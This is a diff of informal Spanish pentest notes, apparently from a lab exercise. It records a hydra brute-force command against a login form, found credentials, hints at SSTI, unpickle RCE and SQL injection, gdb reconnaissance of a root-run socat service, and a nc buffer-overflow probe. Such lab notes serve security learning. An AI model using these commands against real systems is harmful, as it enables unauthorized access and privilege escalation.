@@ -1,7 +1,22 @@
 Buffer Overflow
 Contraseñas malas
 Secretos en el código 
- 
+
+
+var
+
+trafico sin cifrar 
+
+mirar codigo y ver cosas que no sean iguales para encontrar fallos
+burpsuite abierto para ver las peticiones que se mandan (no hace falta interceptar, simplemente dejarle pasar y luego ver el historial para ver si vemos algo)
+
+
+en app2 hay un error que se llama PHP type juggling
+app1(o 3, no recuerda) hay 2 fallos: 
+- SSTI
+- RCE Unpickle
+cree: ssti -> app3, rce unpiclke -> app 1
+
 # NMAP 
 Puertos abiertos:
 ```
@@ -130,6 +145,22 @@ DATABASES = {
 sabiendo esta dirección ahora en el resto de apps podemos encontrar lo mismo. 
 
 Ahora que tenemos la contraseña tratamos de conectarnos pero nos da error por lo que vamos a tratar de hacer fuerza bruta con **hydra**
+```
+hydra -l admin -P ~/wordlists/rockyou.txt app1.unie http-get-form "/users/login/:username=admin&password=^PASS^:F=Invalid" -vV -f -t 16
+```
+Tuve que elegir el metodo get ya que el post estaba protegido por CSRF, la wordlist que he utilizado es rockyou (una bastante conocida)
+
+1. **Credenciales válidas**: `admin:admin`
+    
+2. **Vulnerabilidad**: El endpoint GET `/users/login/` expone el formulario sin protección CSRF
+    
+3. **Problema del servidor**: Login exitoso causa error 500 interno
+    
+4. **Evidencia**:
+    
+    - Status 500 + mensaje "You are now logged in!" en cookie
+        
+    - Cookie `messages` contiene confirmación de login exitoso
 
 ### APP 2 
 Aqui encontramos directamente el codigo sql que crea la tabla junto a los valores y que tipo son por lo que podríamos ver de hacer sql injection y no tendriamos que estar buscando como se llama la tabla y lo que contiene el usuario y contraseña porque ya tenemos como se llama
@@ -172,23 +203,62 @@ foreign key (user_id) references users (id)
 > 
 
 
+# 5555
+Estando en la máquina reviso los procesos relacionados con app con
+```bash
+ps aux | grep -i app
+```
+lo que nos da
+```bash
+user@user-VMware-Virtual-Platform:~$ ps aux | grep -i app
+root        1843  0.0  0.0   9288  3788 ?        Ss   11:42   0:00 socat TCP-LISTEN:5555,fork,reuseaddr, exec:/opt/app5/app5,stderr
+user        3855  0.5  1.9 243036 75504 ?        S    11:42   0:00 /usr/bin/Xwayland :0 -rootless -noreset -accessx -core -auth /run/user/1000/.mutter-Xwaylandauth.STG8F3 -listenfd 4 -listenfd 5 -displayfd 6 -initfd 7 -byteswappedclients
+user        4068  1.7  1.6 3214480 64164 ?       Sl   11:42   0:00 gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js -E -P /usr/share/gnome-shell/extensions/ding@rastersoft.com/app
+user        4170  1.0  1.5 1056256 63044 ?       Sl   11:42   0:00 /usr/bin/gnome-calendar --gapplication-service
+user        4468  0.0  0.0   9144  2248 pts/0    S+   11:42   0:00 grep --color=auto -i app
+```
+por lo que vemos en 
+```bash
+root        1843  0.0  0.0   9288  3788 ?        Ss   11:42   0:00 socat TCP-LISTEN:5555,fork,reuseaddr, exec:/opt/app5/app5,stderr
+```
+parece un servicio personalizado que ejecuta /opt/app5/app5 por lo que revisamos el archivo y sus permisos
+```bash
+user@user-VMware-Virtual-Platform:~$ file /opt/app5/app5
+/opt/app5/app5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6794c42ba9fce64417f4fc13d5be2017ef50bbb0, for GNU/Linux 3.2.0, with debug_info, not stripped
+user@user-VMware-Virtual-Platform:~$ ls -la /opt/app5/app5
+-rwxr-xr-x 1 root root 15688 Sep 29 14:55 /opt/app5/app5
+```
+con esto confirmamos que es x86-64 bit, usa librerías compartidas, tiene debug activado y si logramos explotarlo podemos tener acceso como root
+
+Antes de nada primero reviso si puedo interactar con el poniendo
+```
+nc localhost 5555
+```
+y luego escribiendo cualquier cosa recibiendo
 
 
+Tambien revisamos el codigo fuente
+![[Pasted image 20251118122743.png]]
+
+Ahora vamos a revisar el archivo con gbd
+```bash
+gdb /opt/app5/app5
+info functions
+disas main
+```
+![[Pasted image 20251118120931.png]]
+![[Pasted image 20251118120436.png]]
+![[Pasted image 20251118120524.png]]
+Aqui lo más importante es que lee la entrada con scanf para leer la entrada, pero tambien tenemos que el main es visible y que tiene un buffer de 512 bytes y con GNU_STACK podriamos ejecutar shellcode
+Ahora vamos a comprobar si hay buffer ovweflow con 
+```
+python3 -c "print('A' * 600)" | nc localhost 5555
+```
+y tras ponerlo vemos que ahora no sale el texto que salia antes por lo que lo confirmamos
+![[Pasted image 20251118121221.png]]
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
+Probando encontramos una **vulnerabilidad** tipo **Format String Vulnerability**
 
 
 
@@ -221,3 +291,10 @@ foreign key (user_id) references users (id)
 > [!CAUTION]
 > Negative potential consequences of an action.
 
+smartcard, raduis,  donaub yser abd m. active no se que 1 y 2, vpn, pki, token and lock down devices
+
+
+sudo tcpdump -i <interfaz(lo)> icmp
+
+
+para reverse shell rlwarp ... mirar cheat sheet
